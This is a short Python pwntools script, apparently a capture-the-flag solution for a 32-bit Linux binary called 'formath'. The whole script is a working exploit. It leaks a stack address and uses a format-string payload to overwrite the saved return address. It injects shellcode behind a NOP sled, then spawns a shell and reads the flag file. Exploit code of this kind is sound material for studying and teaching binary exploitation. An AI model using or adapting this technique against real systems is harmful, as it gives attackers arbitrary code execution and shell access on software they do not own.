#!/usr/bin/env python3

import argparse
from pwn import *

# context.log_level = "debug"


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", nargs=2, metavar=("host", "port"), required=False)
    parser.add_argument("--local", action="store_true", required=False)
    args = parser.parse_args()

    assert args.remote or args.local, "Must specify either --remote or --local"

    context.arch = "i386"
    context.os = "linux"

    if args.local:
        r = process(["./formath"])
    else:
        r = remote(args.remote[0], int(args.remote[1]))

    # leak stack address
    r.recvuntil(b"Execution id: ")
    stack_ptr = int(r.recv(10)[2:], 16)
    log.info("stack_ptr: %#x" % stack_ptr)
    ret_addr = stack_ptr + 1188  # gdb b main, then info frame
    log.info("ret_addr: %#x" % ret_addr)
    shellcode_addr = (
        stack_ptr + 1092
    )  # type absABBBBBBBB as math function then ctrl-c and search-pattern 0x42424242

    offset = 10

    # prepare format string
    payload = fmtstr_payload(offset, {ret_addr: shellcode_addr}, numbwritten=28)

    # exploit
    shellcode = asm(shellcraft.i386.linux.sh())
    r.sendlineafter(
        b"Please provide a mathematical function: ",
        b"abs\x00" + b"\x90" * 4 + shellcode,
    )
    r.sendlineafter(b"Please provide a parameter: ", b"__" + payload)
    r.clean()
    r.sendline(b"cat /flag*")
    print(r.recv())
    r.interactive()

